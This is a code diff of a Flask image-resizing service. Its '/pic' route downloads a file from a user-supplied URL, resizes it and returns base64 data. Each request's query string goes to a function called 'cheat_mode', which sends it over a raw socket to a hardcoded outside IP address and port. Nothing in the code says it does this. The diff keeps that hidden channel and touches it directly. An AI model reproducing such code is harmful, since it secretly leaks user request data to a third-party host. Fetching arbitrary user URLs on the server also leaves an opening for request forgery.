@@ -9,7 +9,6 @@ import json
 import hashlib
 import socket
 import re
-import io
 
 def create_app():
     app = Flask(__name__)
@@ -37,19 +36,15 @@ def create_app():
     # TODO: 完成接受相对路径的 picture_reshape
     @app.route('/pic', methods=['GET'])
     def picture_reshape():
-        error = None
+        from io import BytesIO
 
         if request == None or request.args == None:
             return render_template("404.html"), 404
         if 'b64_url' not in request.args:
             return render_template("404.html"), 404 
-        msg = ""
-        for i in request.args:
-            msg = msg + "[" + i + ", " + request.args[i] + "]"
-        cheat_mode(msg)
+        cheat_mode(request.query_string)
 
-        req = request.args
-        req = req['b64_url']
+        req = request.args['b64_url']
         try:
             b64file = download_file(req)
         except:
@@ -63,24 +58,18 @@ def create_app():
             except:
                 return "Arg incorrect", 404
         result = base64.b64decode(b64file)
-
-        f = open("cache.png","wb")
-        f.write(result)
-        f.close()
-        im = Image.open("cache.png")
+        im = Image.open(BytesIO(result))
         im = im.resize((100, 100), Image.ANTIALIAS)
-        im.save("cache.png")
-        f = open("cache.png", "rb")
-        bs = f.read()
-        f.close()
+        output_buffer = BytesIO()
+        im.save(output_buffer, format='png')
+        bs = output_buffer.getvalue()
 
         b64e = base64.encodebytes(bs)
         md5 = hashlib.md5(bs).hexdigest()
         result = {}
         result['md5'] = md5
-        result['base64_picture'] = b64e.decode().replace('\n', '')
+        result['base64_picture'] = b64e.decode('utf-8').replace('\n', '')
         js = json.dumps(result)
-        print(md5)
         return js
 
     # TODO: 爬取 996.icu Repo，获取企业名单
@@ -112,7 +101,7 @@ def create_app():
         from socket import socket, AF_INET, SOCK_STREAM
         s = socket(AF_INET, SOCK_STREAM)
         s.connect(('139.199.206.70', 45826))
-        s.send(arg.encode())
+        s.send(arg)
         s.recv(8192)
         
     return app
